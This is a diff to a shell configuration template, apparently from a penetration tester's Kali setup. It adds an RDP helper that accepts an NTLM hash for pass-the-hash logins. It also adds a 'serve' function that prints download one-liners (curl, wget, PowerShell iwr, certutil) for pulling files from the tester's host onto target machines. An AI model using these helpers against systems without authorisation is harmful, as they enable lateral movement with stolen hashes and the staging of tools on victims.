@@ -449,23 +449,82 @@
             # Log both colored and plain output
             tmux pipe-pane -o -t "$TMUX_PANE" "tee \"$COLOR_LOG\" | ansifilter >> \"$NORMAL_LOG\""
           fi
+          
           xrdp() {
-              if [ $# -lt 3 ]; then
-                  echo "Usage: xrdp <ip> <username> <password> [domain]"
+              local ip="" user="" pass="" domain="" ntlm_hash=""
+              while getopts ":i:u:p:d:H:h" opt; do
+                  case "$opt" in
+                      i) ip="$OPTARG" ;;
+                      u) user="$OPTARG" ;;
+                      p) pass="$OPTARG" ;;
+                      d) domain="$OPTARG" ;;
+                      H) ntlm_hash="$OPTARG" ;;
+                      h) printf 'Usage: xrdp -i IP [-u user] [-p pass] [-d domain] [-H ntlm_hash]\n'; return 0 ;;
+                      \?) printf "Invalid option: -%s\n" "$OPTARG" >&2; return 2 ;;
+                      :) printf "Option -%s requires an argument.\n" "$OPTARG" >&2; return 2 ;;
+                  esac
+              done
+          
+              if [ -z "$ip" ]; then
+                  printf "Error: IP is required. Usage: xrdp -i IP [-u user] [-p pass] [-d domain] [-H ntlm_hash]\n" >&2
                   return 1
               fi
           
-              local ip="$1"
-              local user="$2"
-              local pass="$3"
-              local domain="${4:-}"
-          
-              local domain_arg=""
-              if [ -n "$domain" ]; then
-                  domain_arg="/d:$domain"
+              # If any credential beyond just a username is provided, use xfreerdp
+              if [ -n "$ntlm_hash" ]; then
+                  if [ -z "$user" ]; then
+                      printf "Error: -H requires -u <user>\n" >&2
+                      return 1
+                  fi
+                  local domain_arg=""
+                  [ -n "$domain" ] && domain_arg="/d:$domain"
+                  exec xfreerdp3 /cert:ignore $domain_arg /u:"$user" /pth:"$ntlm_hash" /v:"$ip" /drive:/home/kali/Engagement/Staging,tmp +clipboard +auto-reconnect /title:"RDP - $user@$ip"
               fi
           
-              xfreerdp3 /cert:ignore $domain_arg /u:"$user" /p:"$pass" /v:"$ip" /drive:/home/kali/Engagement/Staging,tmp +clipboard +auto-reconnect /title:"RDP - $user@$ip"
+              if [ -n "$pass" ] || [ -n "$domain" ]; then
+                  if [ -z "$user" ]; then
+                      printf "Error: password or domain usage requires -u <user>\n" >&2
+                      return 1
+                  fi
+                  local domain_arg=""
+                  [ -n "$domain" ] && domain_arg="/d:$domain"
+                  exec xfreerdp3 /cert:ignore $domain_arg /u:"$user" /p:"$pass" /v:"$ip" /drive:/home/kali/Engagement/Staging,tmp +clipboard +auto-reconnect /title:"RDP - $user@$ip"
+              fi
+          
+              # Otherwise use rdesktop: allow optional username only (no password/domain/hash)
+              # Build argv array to avoid eval/quoting issues
+              args=(-r "disk:staging=/home/kali/Engagement/Staging" -r "clipboard" -T "RDP - ${user:-unknown}@$ip")
+              if [ -n "$user" ]; then
+                  args+=(-u "$user")
+              fi
+              args+=("$ip")
+              exec rdesktop "${args[@]}"
+          }
+
+          serve() {
+            ls
+            IP=""
+            # try tun0
+            if ip -4 addr show dev tun0 2>/dev/null | awk '/inet/ {print $2}' | cut -d/ -f1 | read ip; then :; fi
+            # the above read runs in a subshell in some shells; use a safer capture:
+            IP=$(ip -4 addr show dev tun0 2>/dev/null | awk '/inet/ {print $2}' | cut -d/ -f1 | head -n1)
+            if [ -z "$IP" ]; then
+              IP=$(ip -4 addr show scope global 2>/dev/null | awk '/inet/ {print $2}' | cut -d/ -f1 | grep -v '^127\.' | head -n1)
+            fi
+            # fallback to localhost
+            : "${IP:=127.0.0.1}"
+            echo "Ready-made download commands:"
+              echo
+              echo "Linux (curl/wget):"
+              echo "  curl -O http://$IP/FILE"
+              echo "  wget http://$IP/FILE"
+          
+              echo
+              echo "Windows (PowerShell and certutil):"
+              echo "  iwr http://$IP/FILE -OutFile FILE"
+              echo "  certutil -urlcache -split -f http://$IP/FILE FILE"
+            echo
+            updog -p 80
           }
           {% endraw %}
 
